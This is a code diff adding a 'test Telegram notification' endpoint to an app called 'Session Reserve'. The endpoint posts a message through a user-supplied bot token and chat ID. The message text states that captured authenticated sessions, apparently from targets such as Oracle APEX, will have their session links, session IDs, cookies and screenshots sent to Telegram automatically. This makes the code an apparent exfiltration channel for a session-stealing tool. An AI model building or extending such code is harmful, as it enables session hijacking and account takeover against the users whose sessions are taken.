@@ -225,6 +225,51 @@ def update_notification_settings(
 ):
     return crud.update_notification_settings(db, user_id=current_user.id, settings=settings_update)
 
+@app.post("/api/notifications/test-telegram")
+def test_telegram_notification(current_user: models.User = Depends(get_current_user), db: Session = Depends(get_db)):
+    user_settings = crud.get_notification_settings(db, user_id=current_user.id)
+    if not user_settings or not user_settings.telegram_bot_token or not user_settings.telegram_chat_id:
+        raise HTTPException(status_code=400, detail="Please enter and save your Telegram Bot Token and Chat ID first.")
+    
+    import urllib.request
+    import urllib.error
+    
+    test_msg = (
+        "🤖 <b>Session Reserve — Telegram Bot Connected!</b> 🤖\n\n"
+        "✅ Your Telegram bot is active and ready.\n\n"
+        "Whenever an authenticated session is caught (e.g., from Oracle APEX), "
+        "the full session link, session ID, cookies, and page screenshot will be posted here automatically."
+    )
+    url = f"https://api.telegram.org/bot{user_settings.telegram_bot_token}/sendMessage"
+    payload = json.dumps({
+        "chat_id": user_settings.telegram_chat_id,
+        "text": test_msg,
+        "parse_mode": "HTML"
+    }).encode("utf-8")
+    
+    req = urllib.request.Request(url, data=payload, headers={"Content-Type": "application/json"})
+    try:
+        with urllib.request.urlopen(req, timeout=10) as resp:
+            data = json.loads(resp.read().decode("utf-8"))
+            if data.get("ok"):
+                crud.log_activity(db, "Telegram test notification sent successfully", "info", user_id=current_user.id)
+                return {"message": "Test notification sent successfully to your Telegram chatbot!"}
+            else:
+                desc = data.get("description", "Unknown Telegram error")
+                raise HTTPException(status_code=400, detail=f"Telegram API Error: {desc}")
+    except urllib.error.HTTPError as e:
+        err_msg = e.read().decode("utf-8")
+        try:
+            parsed_err = json.loads(err_msg)
+            err_desc = parsed_err.get("description", err_msg)
+        except Exception:
+            err_desc = err_msg
+        logger.error(f"Telegram API HTTP error: {err_desc}")
+        raise HTTPException(status_code=400, detail=f"Telegram API error: {err_desc}")
+    except Exception as e:
+        logger.error(f"Telegram test error: {e}")
+        raise HTTPException(status_code=500, detail=f"Failed to connect to Telegram: {str(e)}")
+
 
 # --- AUDIT LOGS ENDPOINTS ---
 
